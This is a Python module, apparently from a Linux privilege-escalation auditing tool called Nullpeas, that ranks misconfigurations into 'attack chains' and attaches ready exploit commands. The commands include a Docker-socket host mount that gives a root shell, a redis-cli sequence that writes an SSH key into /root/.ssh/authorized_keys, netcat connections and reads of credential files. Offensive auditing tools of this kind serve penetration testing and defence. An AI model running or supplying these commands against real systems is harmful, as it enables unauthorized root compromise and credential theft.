"""
Nullpeas Offensive Chaining Engine

This is the intelligence core that transforms discovered primitives into
realistic attack chains meaningful to offensive operators and blue teams.

It:
 - Consumes structured primitives
 - Builds offensive chains
 - Evaluates feasibility
 - Assigns truth-based offensive classification
 - Ranks opportunities
 - Remains quiet and ethical (NO exploitation)
"""

from __future__ import annotations
from typing import List, Dict
from dataclasses import asdict
from nullpeas.core.offensive_schema import (
    Primitive,
    AttackChain,
    ChainConfidence,
    new_chain_id,
)
from nullpeas.core.exploit_templates import generate_exploit_for_chain


# ----------------------------------------------------------------------
# PRIORITY LOGIC (Updated Taxonomy)
# ----------------------------------------------------------------------

GOAL_PRIORITY = {
    "root_compromise": 1,       # Was root_shell
    "privilege_escalation": 2,
    "persistence": 3,
    "credential_access": 4,
    "internal_pivot": 5,        # Was lateral_movement
    "reconnaissance": 6, 
}

LOOT_TYPES = {"credential_file", "password_store", "config_file", "info_disclosure"}

CLASS_WEIGHT = {
    "catastrophic": 10,
    "critical": 9,
    "severe": 7,
    "high": 6,
    "useful": 4,
    "niche": 1,
}

EXPLOIT_WEIGHT = {
    "trivial": 10,
    "moderate": 6,
    "advanced": 3,
    "theoretical": 1,
}


# ----------------------------------------------------------------------
# INTERNAL HELPERS
# ----------------------------------------------------------------------

def _score_chain(classification: str, exploitability: str) -> int:
    return CLASS_WEIGHT.get(classification, 1) + EXPLOIT_WEIGHT.get(exploitability, 1)


# ----------------------------------------------------------------------
# OFFENSIVE CLASSIFICATION LANGUAGE (Tone Polish)
# ----------------------------------------------------------------------

def _offensive_truth_for(primitive: Primitive) -> str:
    t = primitive.type
    run_as = primitive.run_as

    if t == "root_shell_primitive":
        if primitive.surface == "capabilities":
            return "Binary has 'cap_setuid+ep'. Allows spawning a shell and explicitly setting UID to 0 (Root)."
        return "This effectively grants direct root execution. In offensive reality, this is game-over."

    if t == "docker_host_takeover":
        return "Docker-level control is commonly equivalent to full host compromise. This is catastrophic."

    if t == "suid_primitive":
        return "Unknown SUID binary detected. While not a known GTFOBin, SUID binaries often harbor logic bugs or buffer overflows allowing root."

    if t == "cron_exec_primitive":
        return "This provides timed and repeatable privileged execution. It is a persistence and escalation vector."
    
    if t == "path_hijack_surface":
        return "Writable PATH directory allows interception of commands run by other users. High-value trap."
        
    # === Capabilities ===
    if t == "group_pivot_primitive":
        return "Binary has 'cap_setgid'. Allows pivoting to sensitive groups (disk, shadow) which often leads to root."
    
    if t == "arbitrary_file_access_primitive":
        return "Binary has 'cap_dac_override'. Bypasses all file permissions to Read/Write ANY file on the system."

    # === Systemd ===
    if t == "systemd_unit_write":
        return "Writable service unit allows re-defining ExecStart. This grants root access upon service restart."
    if t == "systemd_binary_write":
        return "Service runs a writable binary. Overwriting this binary grants root access when the service runs."

    if t == "arbitrary_file_write_primitive":
        return "Arbitrary privileged file write enables service hijack, persistence, and potential direct escalation."

    # === Loot ===
    if t == "credential_file":
        return "Discovered credentials often allow immediate lateral movement or access to critical infrastructure."
    
    if t == "password_store":
        if primitive.exploitability == "theoretical":
            return "Password hashes file exists but is not readable. Valuable recon, but not directly exploitable without another pivot."
        return "Access to password hashes allows offline cracking and potential impersonation of users."

    if t == "config_file":
        return "Configuration files frequently contain hardcoded database passwords, API keys, or internal network details."

    # === Network Surfaces (Mature Tone) ===
    if t == "network_docker_surface":
        return "Exposed Docker Socket (TCP) allows mounting the host root filesystem, guaranteeing root compromise."
    
    if t == "network_redis_surface":
        return "Local Redis is a trusted surface. Unauthenticated access allows overwriting authorized_keys or cron jobs to gain shell access."
        
    if t == "network_db_surface":
        return "Local database interfaces are frequently trusted surfaces. In real deployments they often lack strong authentication, offering pivot paths."
        
    if t == "network_remote_access_surface":
        return "Internal remote access interfaces provide opportunities for lateral movement or session hijacking."

    if run_as.lower() == "root":
        return "This surface results in privileged execution and is realistically abusable."

    return "This primitive represents meaningful offensive opportunity with realistic exploitation potential."


# ----------------------------------------------------------------------
# CORE CHAIN BUILDING LOGIC
# ----------------------------------------------------------------------

def _build_direct_chains(primitives: List[Primitive]) -> List[AttackChain]:
    chains = []

    for p in primitives:
        # Direct Root Win Chains
        if p.type in {"root_shell_primitive", "docker_host_takeover", "suid_primitive"}:
            
            chain = AttackChain(
                chain_id=new_chain_id("root"),
                goal="root_compromise", # Taxonomy update
                priority=1,
                exploitability=p.exploitability,
                stability=p.stability,
                noise=p.noise,
                classification=p.offensive_value.classification,
                summary=f"Privileged execution via {p.surface}",
                offensive_truth=_offensive_truth_for(p),
                steps=[{"primitive_id": p.id, "description": f"Leverage {p.surface} privileged capability"}],
                dependent_surfaces=[p.surface],
                confidence=ChainConfidence(
                    score=p.confidence.score,
                    reason=f"Derived directly from {p.surface} primitive"
                ),
                exploit_commands=generate_exploit_for_chain(p)
            )
            chains.append(chain)

        # === Group Pivot ===
        if p.type == "group_pivot_primitive":
            chain = AttackChain(
                chain_id=new_chain_id("privesc"),
                goal="privilege_escalation",
                priority=2,
                exploitability=p.exploitability,
                stability=p.stability,
                noise=p.noise,
                classification=p.offensive_value.classification,
                summary=f"Group Pivot via {p.surface}",
                offensive_truth=_offensive_truth_for(p),
                steps=[{"primitive_id": p.id, "description": "Abuse cap_setgid to gain new group membership"}],
                dependent_surfaces=[p.surface],
                confidence=ChainConfidence(score=p.confidence.score, reason="Verified Capability"),
                exploit_commands=generate_exploit_for_chain(p)
            )
            chains.append(chain)

        # === Loot ===
        if p.type in LOOT_TYPES:
            target_file = p.context.get("path", "file")
            
            cmds = []
            if p.exploitability != "theoretical":
                cmds = [f"cat {target_file}"]
            
            goal = "credential_access"
            priority = 4
            summary_text = f"Intelligence collection via {p.surface}"
            
            if p.type == "info_disclosure":
                goal = "reconnaissance"
                priority = 5  
            
            if p.type in {"credential_file", "password_store"}:
                summary_text = f"Credential harvest via {p.surface}"
            
            chain = AttackChain(
                chain_id=new_chain_id("loot"),
                goal=goal,
                priority=priority,
                exploitability=p.exploitability,
                stability=p.stability, 
                noise=p.noise,         
                classification=p.offensive_value.classification,
                summary=summary_text,
                offensive_truth=_offensive_truth_for(p),
                steps=[{"primitive_id": p.id, "description": f"Harvest {target_file}"}],
                dependent_surfaces=[p.surface],
                confidence=ChainConfidence(score=p.confidence.score, reason="Verified file existence"),
                exploit_commands=cmds
            )
            chains.append(chain)

        # === Network Services (Semantic Logic) ===
        
        # 1. Docker (Catastrophic)
        if p.type == "network_docker_surface":
            ip = p.context.get("ip")
            port = p.context.get("port")
            cmds = [f"docker -H tcp://{ip}:{port} run --rm -it -v /:/mnt alpine chroot /mnt sh"]
            
            chain = AttackChain(
                chain_id=new_chain_id("net_root"),
                goal="root_compromise",
                priority=1,
                exploitability=p.exploitability,
                stability=p.stability,
                noise=p.noise,
                classification="catastrophic",
                summary="Root Compromise via Exposed Docker Socket",
                offensive_truth=_offensive_truth_for(p),
                steps=[
                    {"primitive_id": p.id, "description": f"Connect to Docker Daemon on {ip}:{port}"},
                    {"primitive_id": "mount", "description": "Mount host / filesystem and chroot"}
                ],
                dependent_surfaces=["network"],
                confidence=ChainConfidence(score=9.5, reason="High-confidence default configuration issue"),
                exploit_commands=cmds
            )
            chains.append(chain)
            
        # 2. Redis (Critical)
        elif p.type == "network_redis_surface":
            ip = p.context.get("ip")
            port = p.context.get("port")
            cmds = [
                f"redis-cli -h {ip} flushall",
                f"echo 'ssh-rsa ...' | redis-cli -h {ip} -x set crackit",
                f"redis-cli -h {ip} config set dir /root/.ssh/",
                f"redis-cli -h {ip} config set dbfilename 'authorized_keys'",
                f"redis-cli -h {ip} save"
            ]
            chain = AttackChain(
                chain_id=new_chain_id("net_svc"),
                goal="privilege_escalation",
                priority=2,
                exploitability=p.exploitability,
                stability=p.stability,
                noise=p.noise,
                classification="critical",
                summary="PrivEsc via Local Redis",
                offensive_truth=_offensive_truth_for(p),
                steps=[
                    {"primitive_id": p.id, "description": f"Connect to Redis on {ip}:{port}"},
                    {"primitive_id": "write", "description": "Overwrite authorized_keys or cron job"}
                ],
                dependent_surfaces=["network"],
                confidence=ChainConfidence(score=8.0, reason="Standard unauthenticated Redis risk"),
                exploit_commands=cmds
            )
            chains.append(chain)

        # 3. Databases / Generic (Pivot)
        elif p.type in {"network_db_surface", "network_remote_access_surface", "network_generic_surface", "network_active_session_surface"}:
            ip = p.context.get("ip")
            port = p.context.get("port")
            
            chain = AttackChain(
                chain_id=new_chain_id("net_pivot"),
                goal="internal_pivot", # Taxonomy update
                priority=5,
                exploitability=p.exploitability,
                stability=p.stability,
                noise=p.noise,
                classification=p.offensive_value.classification,
                summary=f"Internal Pivot via {ip}:{port}",
                offensive_truth=_offensive_truth_for(p),
                steps=[
                     {"primitive_id": p.id, "description": f"Enumerate/Exploit service on {ip}:{port}"}
                ],
                dependent_surfaces=["network"],
                confidence=p.confidence,
                exploit_commands=[f"nc -v {ip} {port}"]
            )
            chains.append(chain)

    return chains


def _build_two_stage_chains(primitives: List[Primitive]) -> List[AttackChain]:
    """
    Handles Multi-Stage and Delayed Execution Chains.
    Includes:
    1. File Write -> Service Restart (Persistence)
    2. Writable Cron Job (Timed Escalation)
    3. PATH Hijacking (Trap Escalation)
    4. Systemd Service Abuse (New)
    5. DAC Override -> File Write -> Service (New)
    """
    chains = []
    
    # Index file writes by the resource they control
    writes = {
        p.affected_resource: p 
        for p in primitives 
        if p.type == "arbitrary_file_write_primitive" and p.affected_resource
    }
    
    # Detect CAP_DAC_OVERRIDE (Universal Writer)
    universal_writers = [p for p in primitives if p.type == "arbitrary_file_access_primitive"]

    # 1. Service Hijacking (Generic Write Config -> Restart Service)
    services = [p for p in primitives if p.surface in {"systemd", "services"}]
    
    for svc in services:
        config_path = svc.context.get("unit_file_path") or svc.context.get("config_path")
        
        # A) Standard File Write Logic
        if config_path and config_path in writes:
            writer = writes[config_path]
            chains.append(_create_service_write_chain(writer, svc, config_path))

        # B) CAP_DAC_OVERRIDE Logic (Universal Writer)
        if config_path and universal_writers:
            for writer in universal_writers:
                chains.append(_create_service_write_chain(writer, svc, config_path, method="capabilities"))

    # 2. Cron + Writable Script (Classic)
    cron_primitives = [p for p in primitives if p.type in {"cron_exec_primitive", "cron_user_persistence_surface"}]

    for c in cron_primitives:
        goal = "privilege_escalation" if c.run_as == "root" else "persistence"
        
        chain = AttackChain(
            chain_id=new_chain_id("timed"),
            goal=goal,
            priority=3,
            exploitability=c.exploitability,
            stability=c.stability,
            noise=c.noise,
            classification=c.offensive_value.classification,
            summary="Scheduled execution injection",
            offensive_truth=_offensive_truth_for(c),
            steps=[
                {"primitive_id": c.id, "description": "Modify scheduled execution path/file"},
            ],
            dependent_surfaces=["cron"],
            confidence=ChainConfidence(
                score=c.confidence.score,
                reason="Verified writable cron resource"
            ),
            exploit_commands=generate_exploit_for_chain(c)
        )
        chains.append(chain)

    # 3. PATH Hijacking
    path_primitives = [p for p in primitives if p.type == "path_hijack_surface"]
    
    for p in path_primitives:
        chain = AttackChain(
            chain_id=new_chain_id("trap"),
            goal="privilege_escalation",
            priority=3,
            exploitability=p.exploitability,
            stability=p.stability, # Dynamic
            noise=p.noise,         # Dynamic
            classification="severe",
            summary=f"PATH Interception via {p.affected_resource}",
            offensive_truth=_offensive_truth_for(p),
            steps=[
                {"primitive_id": p.id, "description": "Plant malicious binary in writable PATH directory"},
                {"primitive_id": "wait", "description": "Wait for privileged user to execute command (Interception)"},
            ],
            dependent_surfaces=["path"],
            confidence=ChainConfidence(
                score=p.confidence.score,
                reason="Verified writable PATH directory (os.access)"
            ),
            exploit_commands=generate_exploit_for_chain(p)
        )
        chains.append(chain)

    # 4. Systemd Service Abuse
    systemd_primitives = [
        p for p in primitives 
        if p.type in {"systemd_unit_write", "systemd_binary_write", "systemd_relative_path"}
    ]

    for p in systemd_primitives:
        cmds = []
        if p.context.get("exploit_hint"):
            cmds.append(p.context.get("exploit_hint"))
        else:
            cmds = generate_exploit_for_chain(p)

        chain = AttackChain(
            chain_id=new_chain_id("service"),
            goal="privilege_escalation", 
            priority=2,
            exploitability=p.exploitability,
            stability=p.stability,
            noise=p.noise,
            classification=p.offensive_value.classification,
            summary=f"Service Abuse via {p.context.get('unit_name', 'unknown')}",
            offensive_truth=_offensive_truth_for(p),
            steps=[
                {"primitive_id": p.id, "description": f"Exploit {p.surface} vulnerability ({p.type})"},
                {"primitive_id": "trigger", "description": "Restart service or wait for reboot"},
            ],
            dependent_surfaces=["systemd"],
            confidence=ChainConfidence(
                score=p.confidence.score,
                reason="Verified service misconfiguration (os.access)"
            ),
            exploit_commands=cmds
        )
        chains.append(chain)

    return chains


def _create_service_write_chain(writer: Primitive, svc: Primitive, target: str, method: str = "fs") -> AttackChain:
    """Helper to build file write -> service restart chain"""
    truth = "This chain reliably converts file write into root persistence."
    desc = f"Modify {target} via {writer.surface}"
    
    if method == "capabilities":
        truth = "Using CAP_DAC_OVERRIDE bypasses file permissions to overwrite the service unit."
        desc = f"Overwrite {target} using binary with cap_dac_override"

    return AttackChain(
        chain_id=new_chain_id("persistence"),
        goal="persistence",
        priority=2,
        exploitability="moderate",
        stability="moderate",
        noise="noticeable",
        classification="severe",
        summary=f"Overwrite service config via {writer.surface}",
        offensive_truth=truth,
        steps=[
            {"primitive_id": writer.id, "description": desc},
            {"primitive_id": svc.id, "description": "Trigger service reload/restart"},
        ],
        dependent_surfaces=[writer.surface, svc.surface],
        confidence=ChainConfidence(
            score=min(writer.confidence.score, svc.confidence.score),
            reason="Validated resource intersection"
        ),
        exploit_commands=[] 
    )


# ----------------------------------------------------------------------
# PUBLIC ENGINE ENTRYPOINT
# ----------------------------------------------------------------------

def build_attack_chains(primitives: List[Primitive]) -> List[AttackChain]:
    """
    Takes a set of offensive primitives and produces prioritized, meaningful attack chains.
    """

    if not primitives:
        return []

    chains: List[AttackChain] = []

    # Direct escalation chains
    chains.extend(_build_direct_chains(primitives))

    # Multi-stage escalation chains
    chains.extend(_build_two_stage_chains(primitives))

    # Rank chains by offensive value
    chains.sort(
        key=lambda c: (
            GOAL_PRIORITY.get(c.goal, 99),
            -_score_chain(c.classification, c.exploitability)
        )
    )

    return chains


# ----------------------------------------------------------------------
# RENDERING SUPPORT
# ----------------------------------------------------------------------

def chains_to_dict(chains: List[AttackChain]) -> List[Dict]:
    return [asdict(c) for c in chains]


def summarize_chains(chains: List[AttackChain]) -> str:
    if not chains:
        return "No meaningful offensive chains were identified."

    strongest = chains[0]

    txt = f"""
Nullpeas Offensive Chain Summary

Top Chain:
 - Goal: {strongest.goal}
 - Exploitability: {strongest.exploitability}
 - Stability: {strongest.stability}
 - Noise: {strongest.noise}
 - Truth: {strongest.offensive_truth}

Total Chains Identified: {len(chains)}
"""

    return txt.strip()
